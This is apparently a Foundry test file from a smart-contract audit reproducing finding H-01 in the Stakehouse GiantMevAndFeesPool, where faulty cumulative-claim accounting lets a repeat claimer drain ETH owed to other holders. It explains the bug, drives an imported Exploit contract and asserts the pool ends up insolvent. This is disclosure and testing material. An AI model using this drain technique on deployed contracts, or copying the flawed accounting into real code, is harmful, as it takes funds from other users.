// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./43025-h-01-any-user-being-the-first-to-claim-rewards-from-giantmev.sol";

/*//////////////////////////////////////////////////////////////
    Stakehouse Protocol -- Any user being the first to claim rewards from
    GiantMevAndFeesPool can unexpectedly collect them all (H-01, #43025)

    SyndicateRewardsProcessor._distributeETHRewardsToUserForToken computes
    the amount newly due to a user and pays it out, but then does
    `claimed[user][token] = due` (the amount JUST PAID) instead of adding it
    to the running cumulative total. This under-writes the true lifetime
    claimed baseline on every claim after the first, inflating the "due"
    computed on the user's NEXT claim -- letting a repeat claimer extract
    more ETH than their fair pro-rata share, draining what other LP holders
    are owed and potentially making the pool insolvent for them.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm.
    - test_repeatedClaimsDrainOtherHolder: standalone rebuild isolating the
      exact drift (2 claims by A, then A's 2nd claim already shows the
      inflated "due").
    - test_singleClaimIsCorrect: control -- a user's FIRST-ever claim, and a
      user who only ever claims ONCE, gets exactly their fair share.
//////////////////////////////////////////////////////////////////////////*/
contract GiantMevPoolFirstClaimDriftTest is Test {
    /// @notice HARM via the self-contained Exploit: curator A extracts 20 ETH
    ///         across 3 claims (fair share would be 15 ETH), leaving curator B's
    ///         fair 15 ETH claim to revert against an insolvent pool.
    function test_exploit() public {
        Exploit e = new Exploit();
        uint256 total = 2 * e.STAKE() + 3 * e.REWARD();
        vm.deal(address(this), total);
        e.run{ value: total }();

        assertEq(address(e.pool()).balance, 12 ether, "pool left with only 12 ETH after A's over-extraction");
    }

    /// @notice Standalone rebuild isolating the exact accounting drift: two curators
    ///         with EQUAL shares; A claims after each of 3 reward cycles, B never
    ///         claims. A's 3rd claim alone shows the inflated "due".
    function test_repeatedClaimsDrainOtherHolder() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        Curator a = new Curator(pool);
        Curator b = new Curator(pool);

        vm.deal(address(this), 2 ether + 30 ether);
        a.stake{ value: 1 ether }();
        b.stake{ value: 1 ether }();

        pool.donateRewards{ value: 10 ether }();
        assertEq(a.claim(), 5 ether, "cycle1: correct (first-ever claim)");

        pool.donateRewards{ value: 10 ether }();
        assertEq(a.claim(), 5 ether, "cycle2: still correct (fair increment)");

        pool.donateRewards{ value: 10 ether }();
        // HARM: A's claimed baseline was reset to just the LAST payout (5 ETH)
        // instead of the cumulative 10 ETH after cycle2 -- so this claim pays
        // DOUBLE the fair 5 ETH share of cycle3.
        assertEq(a.claim(), 10 ether, "cycle3: HARM -- double the fair share paid out");

        // B's first-ever claim is computed correctly (15 ETH fair share of all
        // three cycles) -- but the pool no longer holds enough to pay it.
        vm.expectRevert(bytes("transfer failed"));
        b.claim();
    }

    /// @notice Control: a user's single claim (whether it's their first-ever claim,
    ///         or the ONLY claim they ever make) is computed correctly.
    function test_singleClaimIsCorrect() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        Curator solo = new Curator(pool);

        vm.deal(address(this), 1 ether + 10 ether);
        solo.stake{ value: 1 ether }();
        pool.donateRewards{ value: 10 ether }();

        assertEq(solo.claim(), 10 ether, "sole holder's single claim gets the full fair reward");
    }
}
